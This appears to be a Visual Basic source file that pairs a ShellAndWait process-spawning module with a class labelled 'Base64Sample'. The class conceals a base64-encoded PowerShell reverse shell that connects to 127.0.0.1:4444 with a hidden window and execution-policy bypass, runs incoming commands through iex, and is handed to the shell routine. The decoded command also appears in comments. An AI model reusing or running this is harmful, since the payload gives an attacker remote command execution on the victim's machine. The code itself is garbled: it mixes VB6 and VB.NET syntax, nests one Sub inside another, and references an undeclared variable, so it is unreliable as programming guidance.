
Imports System
Imports System.Text

Attribute VB_Name = "mdlShellAndWait"
Option Explicit

Private Declare Function OpenProcess Lib "kernel32" _
    (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, _
    ByVal dwProcessId As Long) As Long

Private Declare Function GetExitCodeProcess Lib "kernel32" _
    (ByVal hProcess As Long, lpExitCode As Long) As Long

Private Const STATUS_PENDING = &H103&
Private Const PROCESS_QUERY_INFORMATION = &H400

'
' Little function go get exit code given processId
'
Function ProcessIsRunning( processId as Long ) as Boolean
    Dim exitCode as Long
    Call GetExitCodeProcess(lProcessId, exitCode)
    ProcessIsRunning = (exitCode = STATUS_PENDING)
End Function

' Spawn subprocess and wait for it to complete.
'   I believe that the command in the command line must be an exe or a bat file.
'   Maybe, however, it can reference any file the system knows how to "Open"
'
' commandLine is an executable. 
' expectedDuration - is for poping up a dialog for whatever
' infoText - text for progressDialog dialog

Public Function ShellAndWait( commandLine As String, _
    expectedDuration As Integer ) As Boolean
    
    Dim inst As Long
    Dim startTime As Long
    Dim expirationTime As Long
    Dim pid As Long
    Dim expiresSameDay As Boolean
    
    On Error GoTo HandleError

    'Deal with timeout being reset at Midnight ($hitForBrains VB folks)
    startTime = CLng(Timer)
    expirationTime = startTime + expectedDuration
    expiresSameDay = expirationTime < 86400
    If Not expiresSameDay Then
        expirationTime = expirationTime - 86400
    End If

    inst = Shell(commandLine, vbMinimizedNoFocus)
    
    If inst <> 0 Then
        pid = OpenProcess(PROCESS_QUERY_INFORMATION, False, inst)

        Do While ProcessIsRunning( pid)
            DoEvents
            If Timer > expirationTime And (expiresSameDay Or Timer < startTime) Then
                Exit Do
            End If
        Loop 
        ShellAndWait = True
    Else
        MsgBox ("Couldn't execute command: " & commandLine)
        ShellAndWait = False
    End If
        
    Exit Function
   
HandleError:
    MsgBox ("Couldn't execute command: " & commandLine)
    ShellAndWait = False
End Function

Namespace Base64code.Decode
    Public Class Base64Sample
        Public Shared Sub Main()
            Dim strB64Encoded As String = "cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCIxMjcuMC4wLjEiLDQ0NDQpOyRzPSRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYj0wLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzLlJlYWQoJGIsIDAsICRiLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRiLDAsICRpKTskc2IgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNiMj0kc2IrIlBTICIrKHB3ZCkuUGF0aCsiPiAiOyRzYnQgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNiMik7JHMuV3JpdGUoJHNidCwwLCRzYnQuTGVuZ3RoKTskcy5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk="
            Dim data As Byte() = Convert.FromBase64String(strB64Encoded)
            Dim strB64Decoded As String = UTF8Encoding.GetString(data)
        '   Console.WriteLine(strB64Decoded) >> 
        '   powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()
        '    Dim strB64Decoded As String = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
        '    Dim data As Byte() = UTF8Encoding.GetBytes(strB64Decoded)
            ' convert the byte array to a Base64 string
        '    Dim strB64Encoded As String = Convert.ToBase64String(data)
            Console.WriteLine(strB64Encoded)
            Sub SpawnDir()
                ShellAndWait(strB64Encoded, 10)
            End Sub
        End Sub
    End Class
End Namespace
                

